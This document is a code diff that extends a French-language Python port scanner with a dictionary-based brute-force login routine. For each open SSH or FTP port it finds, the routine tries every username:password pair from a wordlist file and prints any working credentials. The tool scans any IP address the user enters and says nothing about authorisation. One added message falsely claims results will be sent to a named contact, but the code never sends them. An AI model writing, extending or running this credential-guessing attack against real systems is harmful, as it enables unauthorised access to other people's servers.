@@ -1,6 +1,8 @@
 import socket
 import threading
 import base64
+import paramiko
+from ftplib import FTP
 
 
 def grab_banner(ip, port, results):
@@ -38,7 +40,34 @@ def identify_service(banner):
         return "Service inconnu"
 
 
-def scan_ports(ip, start_port, end_port):
+def attempt_login(ip, port, service):
+    with open("dic.txt", "r") as f:
+        credentials = [line.strip().split(":") for line in f.readlines()]
+
+    for username, password in credentials:
+        if service == "Serveur SSH détecté":
+            try:
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(ip, port=port, username=username, password=password, timeout=1)
+                print(f"[+] Connexion réussie sur SSH {ip}:{port} avec {username}:{password}")
+                ssh.close()
+                break
+            except Exception:
+                continue
+        elif service == "Serveur FTP détecté":
+            try:
+                ftp = FTP()
+                ftp.connect(ip, port, timeout=1)
+                ftp.login(username, password)
+                print(f"[+] Connexion réussie sur FTP {ip}:{port} avec {username}:{password}")
+                ftp.quit()
+                break
+            except Exception:
+                continue
+
+
+def scan_ports(ip, start_port, end_port, output_file):
     threads = []
     results = []
 
@@ -52,12 +81,13 @@ def scan_ports(ip, start_port, end_port):
     for thread in threads:
         thread.join()
 
-    with open("scan_results.txt", "w") as f:
+    with open(output_file, "w") as f:
         for port, encoded_banner in results:
             try:
                 decoded_banner = base64.b64decode(encoded_banner).decode()
                 service = identify_service(decoded_banner)
                 output = f"[+] Port {port} ouvert – {service} : {decoded_banner}"
+                attempt_login(ip, port, service)
             except Exception:
                 output = f"[+] Port {port} ouvert – Service détecté (Base64) : {encoded_banner}"
             print(output)
@@ -68,4 +98,7 @@ if __name__ == "__main__":
     target_ip = input("Entrez l'adresse IP à scanner : ")
     start_port = int(input("Port de début : "))
     end_port = int(input("Port de fin : "))
-    scan_ports(target_ip, start_port, end_port)
+    contact_user = input("Quel utilisateur contacter en cas de découverte de services critiques ? ")
+    output_file = input("Nom du fichier pour enregistrer les résultats : ")
+    print(f"Les résultats seront transmis à {contact_user} si nécessaire et enregistrés dans {output_file}.")
+    scan_ports(target_ip, start_port, end_port, output_file)
